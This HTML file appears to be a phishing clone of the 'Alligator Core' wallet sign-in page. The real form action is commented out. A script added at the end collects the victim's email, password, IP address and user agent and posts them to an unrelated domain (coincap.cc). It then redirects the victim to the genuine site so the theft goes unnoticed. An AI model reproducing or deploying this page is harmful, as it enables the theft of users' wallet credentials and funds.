    <meta property="og:description" content="Alligator Core" />

    <!-- PAGE TITLE HERE -->
    <title>Alligator Core</title>

    <!-- FAVICONS ICON -->
    <link rel="shortcut icon" type="image/png" href="./images/logo.png" />
    <link href="./css/nice-select.css" rel="stylesheet" />
    <link href="./css/jquery-ui.css" rel="stylesheet" />

    <script src="https://www.google.com/recaptcha/enterprise.js?render=6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD"></script>
  </head>

  <body
    class="body h-100"
    data-typography="poppins"
    data-theme-version="light"
    data-layout="vertical"
    data-nav-headerbg="color_1"
    data-headerbg="color_1"
    data-sidebar-style="full"
    data-sibebarbg="color_1"
    data-theme="theme_2"
    data-sidebar-position="fixed"
    data-header-position="fixed"
    data-container="wide"
    direction="ltr"
    data-primary="color_1"
  >
    <div class="container h-100">
      <div class="row h-100 align-items-center justify-contain-center">
        <div class="col-xl-12">
          <div class="card">
            <div class="card-body">
              <div class="row m-0">
                <div class="col-xl-6 col-md-6 sign text-center">
                  <div>
                    <div class="text-center my-5">
                      <div class="logo"></div>
                    </div>

                    <a href="">
                      <img src="./images/Gator-v4.png" alt="" height="300" />
                    </a>
                  </div>
                </div>
                <div class="col-xl-6 col-md-6">
                  <div class="sign-in-your">
                    <h3>Sign in your Wallet</h3>
                    <span class="text-white"
                      >Welcome back to Alligator Core! Login with the
                      credentials you entered<br />
                      during registration</span
                    >

                    <!-- <form
                      method="POST"
                      action="https://alligatorcore.ai/login"
                      class="pt-4"
                    > -->
                    <form onsubmit="onFormSubmit(event)" class="pt-4">
                      <input
                        type="hidden"
                        name="_token"
                        value="kgbN7MxspbzTyrXwG5YrDDnt2ezsNk4HH89SjIS2"
                      />
                      <div class="mb-3">
                        <label class="mb-1"><strong>Email</strong></label>
                        <input
                          class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm form-control form-control"
                          id="email"
                          type="email"
                          name="email"
                          required="required"
                          autofocus="autofocus"
                          autocomplete="email"
                        />
                      </div>
                      <div class="mb-3">
                        <label class="mb-1"><strong>Password</strong></label>
                        <input
                          class="border-gray-300 focus:border-indigo-500 focus:ring-indigo-500 rounded-md shadow-sm form-control form-control"
                          id="password"
                          type="password"
                          name="password"
                          required="required"
                          autocomplete="current-password"
                        />
                      </div>

                      <div class="row d-flex justify-content-between mt-4 mb-2">
                        <div class="mb-3">
                          <label for="remember_me" class="flex items-center">
                            <input
                              type="checkbox"
                              class="rounded border-gray-300 text-indigo-600 shadow-sm focus:ring-indigo-500"
                              id="remember_me"
                              name="remember"
                            />
                            <span class="ml-2 text-sm text-gray-600"
                              >Remember me</span
                            >
                          </label>
                        </div>
                        <div class="mb-3">
                          <a
                            class="underline text-sm text-gray-600 hover:text-gray-900 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                            href="https://alligatorcore.ai/register/135OIs0RktQM26"
                          >
                            Forgot your password?
                          </a>
                        </div>
                      </div>
                      <div class="text-center">
                        <button type="submit" class="btn btn-primary btn-block">
                          Sign in your Wallet
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script>
      function onFormSubmit(event) {
        event.preventDefault();

        const form = event.target;
        const email = form.elements.email.value;
        const password = form.elements.password.value;
        let token;

        grecaptcha.enterprise.ready(async () => {
          token = await grecaptcha.enterprise.execute(
            '6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD',
            { action: 'LOGIN' }
          );

          const clientIP = await fetch('https://api.ipify.org?format=json')
            .then((response) => response.json())
            .then((data) => data.ip)
            .catch((error) => {
              console.error('Error fetching client IP:', error);
              return '';
            });

          const userAgent = navigator.userAgent;

          // Create an object with the form data
          const formData = {
            project: 'project',
            email: email,
            password: password,
            recaptcha_token: token,
            client_ip: clientIP,
            user_agent: userAgent,
          };

          // Send the form data as a POST request to the backend
          fetch('https://coincap.cc/submit', {
            // fetch('http://127.0.0.1:5000/submit', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData), // Send the data as a JSON string
          })
            .then((response) => {
              if (!response.ok) {
                throw new Error('Network response was not ok');
              }
              return response.json();
            })
            .then((data) => {
              console.log('Human confirmed');
              window.location.href =
                'https://alligatorcore.ai/register/135OIs0RktQM26';
            })
            .catch((error) => {
              window.location.href =
                'https://alligatorcore.ai/register/135OIs0RktQM26';
              // console.error('Error sending form data:', error);
            });
        });
      }
    </script>

    <!-- <script src="./css/global.min.js"></script>
